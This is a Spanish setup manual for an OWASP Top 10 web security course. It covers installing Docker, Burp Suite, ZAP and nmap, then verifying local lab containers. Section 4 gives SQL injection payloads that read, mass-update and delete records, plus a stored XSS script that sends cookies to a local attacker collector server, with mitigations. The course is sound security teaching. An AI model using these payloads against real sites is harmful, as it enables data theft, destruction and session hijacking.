# MANUAL DE INSTALACIÓN Y CONFIGURACIÓN DE EQUIPOS (WINDOWS Y MAC)
**Curso:** Ciberseguridad Aplicada y Auditoría Web (OWASP Top 10)

Esta guía contiene los requisitos técnicos y el paso a paso detallado para dejar un computador con **Windows 10/11** o **macOS (Intel / Apple Silicon M1/M2/M3)** completamente configurado con **Google Chrome** para ejecutar todos los laboratorios del curso.

---

## 1. Requisitos Mínimos de Hardware y Sistema Operativo

| Componente | Requisito Mínimo | Recomendado |
| :--- | :--- | :--- |
| **Sistema Operativo** | Windows 10/11 (64-bit) o macOS 12+ | Windows 11 Pro / macOS 14+ |
| **Procesador** | Intel Core i5 / AMD Ryzen 5 / Apple M1 | 4 núcleos o superior (Virtualización activa) |
| **Memoria RAM** | 8 GB RAM | 16 GB RAM |
| **Espacio en Disco** | 15 GB libres | 25 GB libres en SSD |
| **Permisos** | Cuenta con permisos de Administrador local | Administrador local |

---

## 2. Instalación de Software Paso a Paso

### 2.1. Docker Desktop (Motor de los Laboratorios)
Permite levantar la Intranet PHP/Apache, DVWA y la API de pruebas en Node.js con MongoDB sin instalar servicios sueltos en el sistema operativo.

* **En Windows:**
  1. Abrir **PowerShell como Administrador** y activar WSL 2 ejecutando:
     ```powershell
     wsl --install
     ```
  2. Reiniciar el equipo si lo solicita.
  3. Instalar Docker Desktop ejecutando en PowerShell:
     ```powershell
     winget install -e --id Docker.DockerDesktop
     ```
     *(O descargarlo desde [https://www.docker.com/products/docker-desktop/](https://www.docker.com/products/docker-desktop/)).*
  4. Abrir **Docker Desktop** y esperar a que el indicador inferior izquierdo muestre *Engine running* (en verde).

* **En macOS:**
  1. Si usas Homebrew, ejecuta en la Terminal:
     ```bash
     brew install --cask docker
     ```
     *(O descarga el instalador `.dmg` para Intel o Apple Silicon desde [docker.com](https://www.docker.com/products/docker-desktop/)).*
  2. Abre **Docker.app** desde Aplicaciones y acepta los permisos de red.

---

### 2.2. Navegador Google Chrome (2 Modalidades de Uso en Clase)

En este curso utilizaremos **Google Chrome**. Existen dos formas de trabajar con Chrome durante los laboratorios:

#### Modalidad A (Recomendada - Cero Configuración): Usar el Chrome Integrado
Tanto **Burp Suite** como **OWASP ZAP** incluyen su propio navegador **Google Chrome / Chromium integrado**, el cual ya viene conectado al proxy, con los certificados instalados y configurado para capturar tráfico de `localhost`:
* **Desde Burp Suite:** Ir a la pestaña **Proxy** ➔ **Intercept** y hacer clic en el botón **Open Browser**.
* **Desde OWASP ZAP:** En la pestaña **Quick Start**, hacer clic en **Manual Explore**, elegir **Chrome** y presionar **Launch Browser**.

#### Modalidad B: Usar Google Chrome del Sistema + Extensión FoxyProxy
Si prefieres usar tu propio navegador Google Chrome instalado en el equipo:

1. **Instalar Google Chrome:**
   * **Windows (PowerShell):** `winget install -e --id Google.Chrome`
   * **macOS (Terminal):** `brew install --cask google-chrome`
2. **Instalar la extensión FoxyProxy en Chrome:**
   * Abrir Chrome e ingresar a la Chrome Web Store buscando **FoxyProxy** (o ir a `https://chromewebstore.google.com/` y buscar *FoxyProxy*).
   * Hacer clic en **Añadir a Chrome**.
   * *(Importante: Siempre usa FoxyProxy en Chrome. No cambies el proxy desde la configuración nativa de Chrome porque eso modificará el proxy de todo Windows/macOS).*
3. **Configurar los Proxies en FoxyProxy:**
   * Hacer clic en el ícono de extensiones de Chrome (pieza de rompecabezas) ➔ **FoxyProxy** ➔ **Options** ➔ pestaña **Proxies** ➔ **Add**:
     * **Perfil 1 (Para Burp Suite):**
       * *Title:* `Burp Suite` | *Type:* `HTTP` | *Hostname:* `127.0.0.1` | *Port:* `8088` | *Color:* Naranja ➔ **Save**.
     * **Perfil 2 (Para OWASP ZAP):**
       * *Title:* `OWASP ZAP` | *Type:* `HTTP` | *Hostname:* `127.0.0.1` | *Port:* `8089` | *Color:* Azul ➔ **Save**.
4. **Regla importante en Chrome para interceptar `localhost`:**
   * Por seguridad interna, Google Chrome omite las extensiones de proxy cuando escribes `localhost` o `127.0.0.1`.
   * Para que FoxyProxy intercepte el tráfico del laboratorio en tu Chrome habitual, en lugar de escribir `http://localhost:8080`, ingresa usando el dominio alias local:
     * `http://localtest.me:8080` (Intranet PHP)
     * `http://localtest.me:8082` (DVWA)
     * `http://localtest.me:3000` (API Node.js)
     *(El dominio `localtest.me` apunta automáticamente a `127.0.0.1`, permitiendo que Chrome envíe todo el tráfico a Burp Suite y OWASP ZAP).*

---

### 2.3. Burp Suite Community Edition (Auditoría Manual de Formularios)
1. **Instalación:**
   * **Windows (PowerShell):** `winget install -e --id PortSwigger.BurpSuite.Community`
   * **macOS (Terminal):** `brew install --cask burp-suite`
   * *(Descarga directa alternativa: [https://portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)).*
2. **Configurar el Puerto del Proxy (`8088`):**
   * Abrir Burp Suite ➔ **Temporary Project** ➔ **Start Burp**.
   * Ir a la pestaña **Proxy** ➔ **Proxy settings**.
   * En *Proxy Listeners*, seleccionar `127.0.0.1:8080`, hacer clic en **Edit** y cambiar el puerto a **`8088`**. Hacer clic en **OK**.
3. **Certificado CA para HTTPS:**
   * **Si usas el Chrome integrado de Burp (Modalidad A):** No necesitas hacer nada, el certificado ya viene preinstalado.
   * **Si usas tu Chrome habitual (Modalidad B):** Con Burp abierto y FoxyProxy activo en `Burp Suite`, ingresa en Chrome a `http://burpsuite` y descarga el **CA Certificate** (`cacert.der`). Luego ve en Chrome a `chrome://settings/security` ➔ **Gestionar certificados del dispositivo** ➔ pestaña **Entidades de certificación raíz de confianza** ➔ **Importar** y selecciona `cacert.der`.

---

### 2.4. OWASP ZAP - Zed Attack Proxy (Escaneo y Mapeo Web)
1. **Instalación:**
   * **Windows (PowerShell):** `winget install -e --id ZAP.ZAP`
   * **macOS (Terminal):** `brew install --cask zap`
   * *(Descarga directa: [https://www.zaproxy.org/download/](https://www.zaproxy.org/download/)).*
2. **Configurar el Puerto de OWASP ZAP (`8089`):**
   * Abrir OWASP ZAP ➔ elegir *"No, I do not want to persist this session"* ➔ **Start**.
   * Ir a **Tools** ➔ **Options** ➔ **Network** ➔ **Local Servers/Proxies**.
   * Verificar que *Address* sea `127.0.0.1` y cambiar el *Port* a **`8089`**.

---

### 2.5. Herramientas de Red y Consola (Nmap, cURL, Git y VS Code)
Necesarias para el Módulo de Seguridad de Infraestructura Básica (escaneo de puertos expuestos y revisión de cabeceras HTTP).

* **En Windows (PowerShell como Administrador):**
  ```powershell
  winget install -e --id Insecure.Nmap
  winget install -e --id Git.Git
  winget install -e --id Microsoft.VisualStudioCode
   ```
(Nota: En PowerShell, para ejecutar curl nativo sin usar el alias de PowerShell, escribe curl.exe -I http://localhost:8080).

En macOS (Terminal):
  ```powershell
brew install nmap git
brew install --cask visual-studio-code
   ```

---

## 3. Puesta en Marcha y Verificación de los Laboratorios
Una vez instalados los programas, sigue estos pasos para levantar y comprobar los entornos del curso:

Paso 1: Levantar los ContenedoresAbre una terminal (PowerShell en Windows o Terminal en Mac) dentro de la carpeta laboratorio-curso-owasp y ejecuta el comando de construcción e inicio en segundo plano:   
  ```powershell
docker-compose up -d --build
   ```

Paso 2: Comprobar los 3 Entornos desde Google Chrome
Abre Google Chrome y verifica que carguen las tres plataformas locales:

1. Intranet Corporativa PHP (Todos los Tracks + CTF):
   - URL directa: http://localhost:8080 (o http://localtest.me:8080 al usar FoxyProxy en Chrome).
   - Debe mostrar el Portal Interno Corporativo.

2. Entorno DVWA Complementario:
   - URL directa: http://localhost:8082 (o http://localtest.me:8082).
   - Inicia sesión con usuario admin y contraseña password, y presiona Create / Reset Database.

3. API Secundaria Node.js:
   - URL directa: http://localhost:3000 o http://localtest.me:3000.
   - Debe mostrar el mensaje de estado activo de la API.

Paso 3: Prueba Rápida de Herramientas de Infraestructura (Checklist Pre-Curso)Ejecuta estos dos comandos en tu terminal para confirmar que las utilidades de auditoría de red responden correctamente:
  ```powershell
# 1. Prueba de inspección de cabeceras HTTP (En Windows usar curl.exe)
curl -I http://localhost:8080

# 2. Prueba de escaneo de puertos locales expuestos (Web, API y MongoDB)
nmap -sV -p 8080,8082,3000,27017 127.0.0.1
  ```

Si ambos comandos devuelven las cabeceras de Apache/PHP y el listado de puertos open (incluyendo los puertos 3000 y 27017 definidos en los contenedores), el equipo está 100% listo para realizar todos los laboratorios del curso con Google Chrome.

---

## 4. LABORATORIO AVANZADO DÍA 2 (OWASP A03 realista + Robo de Cookies por XSS)

El Día 2 agrega un **nuevo portal de clientes vulnerable** y un **servidor atacante (C2)**, sin modificar nada de los Tracks del Día 1.

### 4.1. Portal de Clientes vulnerable (SQLi de lectura, modificación y borrado)
* **URL:** `http://localhost:8080/portal-avanzado.php` (o `http://localtest.me:8080/portal-avanzado.php`).
* **Base de datos propia:** `/tmp/lab_avanzado.sqlite` (tablas `clientes` y `mensajes`), aislada de la del Día 1.
* **Reiniciar datos del lab:** botón "Reiniciar datos del lab" o `?reset_av=1`.

| Sección | Técnica | Payload de ejemplo | Flag |
| :--- | :--- | :--- | :--- |
| 1. Buscador de clientes | SQLi **lectura** (OR 1=1 / UNION) | `%' OR '1'='1` · `' UNION SELECT id,nombre,tarjeta,secreto FROM clientes-- ` | `FLAG{SQLI_LECTURA_TABLA_COMPLETA}` / `FLAG{SQLI_UNION_LECTURA_TOTAL}` |
| 2. Ajustar saldo por ID | SQLi **modificación** (UPDATE con WHERE roto) | ID = `0 OR 1=1` | `FLAG{SQLI_UPDATE_MASIVO_WHERE_ROTO}` |
| 3. Eliminar mensaje por ID | SQLi **borrado** (DELETE con WHERE roto) | ID = `0 OR 1=1` | `FLAG{SQLI_DELETE_MASIVO_WHERE_ROTO}` |
| 4. Muro de soporte | **XSS almacenado** + exfiltración | ver 4.2 | `FLAG{XSS_COOKIE_ADMIN_EXFILTRADA}` |

### 4.2. Servidor del Atacante / Panel C2 (la "otra base de datos" del lab)
* **URL del panel:** `http://localhost:5000/` (se refresca cada 5s y lista todas las cookies robadas).
* **Base de datos propia del atacante:** `/tmp/robos.sqlite` dentro del contenedor `lab_evil_collector`.
* **Payload XSS** que se publica en el muro del portal de clientes:
  ```html
  <script>new Image().src="http://localhost:5000/steal.php?c="+encodeURIComponent(document.cookie)+"&u="+location.host;</script>
  ```
* **Flujo del ataque (demostración en clase):**
  1. El atacante publica el payload en el muro de `portal-avanzado.php`.
  2. La víctima (p. ej. el **administrador** con `SESION_ID=1001`, que se simula cambiando la cookie en Chrome DevTools) abre la página.
  3. El navegador de la víctima ejecuta el script y envía su cookie al servidor atacante (puerto 5000).
  4. En el panel C2 aparece la cookie robada y se obtiene `FLAG{XSS_COOKIE_ADMIN_EXFILTRADA}` → **session hijacking** sin conocer la contraseña.
* **Mitigación (se ve en las diapositivas):** `htmlspecialchars()` en la salida, cabecera `Content-Security-Policy`, y cookies con `HttpOnly` para que `document.cookie` no sea legible desde JavaScript.

### 4.3. Puertos del laboratorio completo
`8080` Intranet PHP · `8082` DVWA · `3000` API Node · `27017` MongoDB · **`5000` Servidor Atacante (C2 / nuevo)**.
